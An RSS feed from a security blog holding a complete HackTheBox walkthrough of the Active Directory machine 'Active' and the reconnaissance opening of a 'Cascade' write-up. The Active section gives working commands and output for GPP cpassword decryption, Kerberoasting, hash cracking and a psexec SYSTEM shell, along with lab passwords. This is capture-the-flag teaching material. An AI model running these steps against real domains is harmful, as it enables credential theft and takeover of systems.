<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Domain-Controller on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/domain-controller/</link>
    <description>Recent content in Domain-Controller on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/domain-controller/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Active</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
      <description>Finding passwords in Group Policy Preferences and roasting Kerberos</description>
      <content:encoded><![CDATA[<p>Active is an Active Directory system, it starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account and crack it. The cracked password is used to login remotely.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Active Directory GPP</li>
<li>Kerberoasting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 23:20 EDT
Nmap scan report <span class="k">for</span> 10.10.10.100
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
<span class="p">|</span> dns-nsid: 
<span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-11 03:20:53Z<span class="o">)</span>
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open   tcpwrapped
4915/tcp  closed frcs
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49169/tcp open   msrpc         Microsoft Windows RPC
49172/tcp open   msrpc         Microsoft Windows RPC
49180/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 4s
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled and required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-07-11T03:21:48
<span class="p">|</span>_  start_date: 2021-07-09T05:18:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 71.11 seconds
</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
<p>There is no zone transfer in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ dig axfr @10.10.10.100 10.10.10.100

<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;</span> Transfer failed.
</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -H 10.10.10.100
<span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</code></pre></div><h4 id="replication-share">Replication Share</h4>
<p>The <code>Replication</code> share contains a lot of folders. I will download them all recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> ls
  .                                   D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
  ..                                  D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
  active.htb                          D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>

                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> prompt of
smb: <span class="se">\&gt;</span> mget * 
getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size <span class="m">23</span> as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ find . -type f -iname groups.xml                                                                            
./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <strong>active.htb\SVC_TGS</strong>. I will note this password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ cat ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span> <span class="nv">image</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">&#34;2018-07-18 20:46:06&#34;</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;U&#34;</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">description</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>There is nothing much I can do in LDAP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
dn:
namingContexts: <span class="nv">DC</span><span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
→ kali@kali «active» «10.10.14.75» 
$ ldapsearch -LLL -x -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> 
Operations error <span class="o">(</span>1<span class="o">)</span>
Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v1db1
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p>
<p>When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> and that key can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
GPPstillStandingStrong2k18
</code></pre></div><h4 id="users-share">Users Share</h4>
<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ crackmapexec smb active.htb -u <span class="s1">&#39;SVC_TGS&#39;</span> -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">7601</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         10.10.10.100    <span class="m">445</span>    DC               Share           Permissions     Remark
SMB         10.10.10.100    <span class="m">445</span>    DC               -----           -----------     ------
SMB         10.10.10.100    <span class="m">445</span>    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    <span class="m">445</span>    DC               C$                              Default share
SMB         10.10.10.100    <span class="m">445</span>    DC               IPC$                            Remote IPC
SMB         10.10.10.100    <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    <span class="m">445</span>    DC               Replication     READ            
SMB         10.10.10.100    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    <span class="m">445</span>    DC               Users           READ  
</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is <code>C:\Users\</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Users -U <span class="s1">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> ls
  .                                  DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
  ..                                 DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
  Administrator                       D        <span class="m">0</span>  Mon Jul <span class="m">16</span> 06:14:21 <span class="m">2018</span>
  All Users                       DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
  Default                           DHR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 02:38:21 <span class="m">2009</span>
  Default User                    DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
  desktop.ini                       AHS      <span class="m">174</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
  Public                             DR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
  SVC_TGS                             D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:16:32 <span class="m">2018</span>

                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

                10459647 blocks of size 4096. 5722238 blocks available
smb: \&gt; more SVC_TGS\Desktop\user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service. It was found that the administrator has the <code>servicePrincipalName</code> (SPN) attribute set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ ldapsearch -LLL -x -D <span class="s1">&#39;SVC_TGS@active.htb&#39;</span> -w <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> <span class="s2">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb

...<span class="o">[</span>SNIP<span class="o">]</span>...
adminCount: <span class="m">1</span>
accountExpires: <span class="m">0</span>
logonCount: <span class="m">34</span>
sAMAccountName: Administrator
sAMAccountType: <span class="m">805306368</span>
servicePrincipalName: active/CIFS:445
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab">Service Ticket</a> (ST).</p>
<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box starting from step number 3.</p>
<p><div class="img-container"><img src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  /></div>
</p>
<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
<p>Using this case, I want to access a CIFS service, so I need to ask the server (KDC) for it. The server will search the SPN of the CIFS service, which is <code>active/CIFS:445</code>, and that SPN is registered to the administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash  (derived from password)  of the administrator account and send the ticket to me. Now that I have the TGS ticket, but instead of using (forwarding) this ticket to authenticate to the CIFS service, I keep that ticket and attempt a brute-force attack against it to recover the administrator password.</p>
<blockquote>
<p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
</blockquote>
<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll use the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tool captures the ticket and automatically formats it into hashcat crackable format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
$ impacket-GetUserSPNs active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             



<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
<p>The password of the TGS can be recovered using hashcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...:Ticketmaster1968
</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
<h4 id="impacket-psexec">Impacket-psexec</h4>
<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ impacket-psexec active.htb/administrator:<span class="s1">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file olAAJsqj.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Creating service mvjR on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Starting service mvjR.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> ipconfig
nt authority<span class="se">\s</span>ystem

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.<span class="o">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span class="o">}</span>:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
</code></pre></div><p>The root flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
b5fc76...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cascade</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</link>
      <pubDate>Fri, 23 Apr 2021 17:09:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</guid>
      <description>Plundering dead Active Directory accounts</description>
      <content:encoded><![CDATA[<p>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by <a href="https://vbscrub.com/">VbScrub</a>, the creator of <a href="/writeup/htb-nest">Nest</a>. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>RPC enumeration</li>
<li>Decrypting VNC password</li>
<li>Reversing .NET</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>rpcclient - Preinstalled in Kali Linux</li>
<li>smbget - Preinstalled in Kali Linux</li>
<li>evil-winrm - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>dnSpy - <a href="https://github.com/dnSpy/dnSpy/">https://github.com/dnSpy/dnSpy/</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows the typical port used by Active Directory domain controller.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
<span class="p">|</span> dns-nsid:
<span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2020-06-03 00:20:10Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 1s
<span class="p">|</span> smb2-security-mode:
<span class="p">|</span>   2.02:
<span class="p">|</span>_    Message signing enabled and required
<span class="p">|</span> smb2-time:
<span class="p">|</span>   date: 2020-06-03T00:21:02
<span class="p">|</span>_  start_date: 2020-06-02T04:24:21
</code></pre></div><p><code>nmap</code> discovers the domain name of Cascade and also identifies the OS version.</p>
<p>I&rsquo;ll take notes on these:</p>
<ul>
<li>Domain: <code>cascade.local</code></li>
<li>Host: Windows Server 2008 R2 SP1</li>
</ul>
